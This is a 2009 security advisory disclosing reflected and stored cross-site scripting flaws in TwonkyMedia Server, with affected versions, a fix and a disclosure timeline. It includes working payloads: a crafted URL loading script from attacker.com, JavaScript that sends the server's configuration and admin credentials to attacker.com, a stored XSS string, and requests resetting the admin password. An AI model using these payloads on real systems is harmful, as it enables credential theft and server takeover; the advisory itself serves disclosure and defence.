@@ -1,0 +1,146 @@
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+===========================================================================
+Title:    TwonkyMedia Server Multiple Cross-Site Scripting Vulnerabilities
+
+Product:  TwonkyMedia Server
+Vendor:   TwonkyMedia (PacketVideo Corporation), http://www.twonkymedia.com
+
+Author:   Davide Canali
+E-mail:   davide (at) davidecanali (dot) com
+
+Date:     2009-10-21
+===========================================================================
+
+1. BACKGROUND:
+
+TwonkyMedia Server is a DLNA-compliant, UPnP AV-compliant software
+that allows to share and stream media to hundreds of popular consumer
+electronics devices. It is available for Windows, Linux, Macintosh and
+for various different architectures.
+TwonkyMedia Server is bundled on a variety of CE and NAS devices from
+leading manufacturers, including: Buffalo LinkStation, HP Media Vault,
+LaCie Ethernet Disk, Philips Streamium music players, Western Digital
+Share Space.
+
+2. DESCRIPTION:
+
+TwonkyMedia Server contains multiple Cross-Site Scripting (XSS)
+vulnerabilities.
+The TwonkyMedia web server fails to adequately sanitize user input
+(HTTP request strings and form input); thus, an attacker may be able
+to execute arbitrary script code in a victim's browser.
+
+3. DETAILS
+
+Two main vulnerabilities have been found.
+The TwonkyMedia server IP address, in the following, is just denoted
+as "twonky".
+
+1st VULNERABILITY:
+==================
+
+A HTTP GET request at http://twonky:9000/NON-EXISTENT-PAGE results in
+a 404 error page containing:
+
+<HTML><HEAD><TITLE>404 Not Found</TITLE></HEAD><BODY><H1>Not
+Found</H1>/NON-EXISTENT-PAGE was not found
+ on this server.</BODY></HTML>
+
+Thus, an attacker could induce the server administrator (victim) in
+clicking on a specially crafted link, pointing to:
+
+http://twonky:9000/fake_config_page<script type="text/javascript"
+src="http://attacker.com/malicious.js" ></script>
+
+Clicking this link, the victim loads and executes the attacker's script.
+An example of this script can be:
+
+xmlhttp=new XMLHttpRequest();
+xmlhttp.onreadystatechange=function()
+{
+if(xmlhttp.readyState==4)
+  {
+
+document.location="http://attacker.com/get.php?data="+escape(xmlhttp.responseText);
+  }
+}
+xmlhttp.open("GET","/rpc/get_all",true);
+xmlhttp.send(null);
+
+This script allows the attacker to read all the server configuration
+variables, including the administrator's username and password.
+(The victim, if not already logged on the twonky media server
+configuration panel, is asked for username and password)
+
+2nd VULNERABILITY:
+==================
+
+
+
+Form inputs are not well validated, so an attacker can even run a
+Stored Cross-Site Scripting. Most of the pages of the management
+interface are vulnerable.
+As an example, writing the following string in one of the "Content
+Locations" fields in the "Sharing" setup page results in a Stored XSS,
+which can be exploited by a malicious user every time the victim
+visits the config page, once infected:
+
+Directory" /><script> alert('stored!');</script><br
+
+In this way, the page can arbitrarily and permanently be modified by
+an attacker, who can inject any kind of content in it.
+
+
+In addition, leveraging one of these vulnerabilities, an attacker can
+modify any server configuration parameter. As an example, to modify
+the administrator username and password once the victim visits the
+page, it is sufficient to include a script that sends 2 requests at:
+
+http://twonky:9000/rpc/set_option?accessuser=NEWUSER
+http://twonky:9000/rpc/set_option?accesspwd=NEWPASSWORD
+
+4. AFFECTED PRODUCTS
+
+1st Vulnerability:
+==================
+TwonkyMedia Server 4.4.17 and prior versions
+TwonkyMedia Server 5.0.65 and prior versions
+
+This vulnerability has been fixed on versions 4.4.18+, 5.0.66+, and 5.1.X.
+
+2nd Vulnerability:
+==================
+At this date, all versions of TwonkyMedia Server are still vulnerable.
+
+5. SOLUTIONS
+
+To fix the 1st vulnerability, upgrade to the latest version of
+TwonkyMedia Server. Latest builds are available at:
+http://twonkyforum.com/viewtopic.php?f=2&t=6678
+
+6. DISCLOSURE TIMELINE
+
+2009-06-01: Vendor notified
+2009-06-08: Vendor response
+2009-06-10: Status update from the development team
+2009-06-10: Sent email stating that I'll publish the advisory once new
+versions are released
+2009-10-06: New releases checked; 2nd vulnerability was not fixed.
+Vendor notified
+2009-10-21: No response received; release of this advisory
+
+===========================================================================
+Davide Canali
+davide (at) davidecanali (dot) com
+
+
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.9 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iEYEARECAAYFAkrfQs4ACgkQ6yrfzQzWVMGQLwCbBgCWYoXIYWD3qkHlqtRaSs/a
+g8oAn392UxQB9SvPJf77kfnn4zA1zbf5
+=SY7o
+-----END PGP SIGNATURE-----
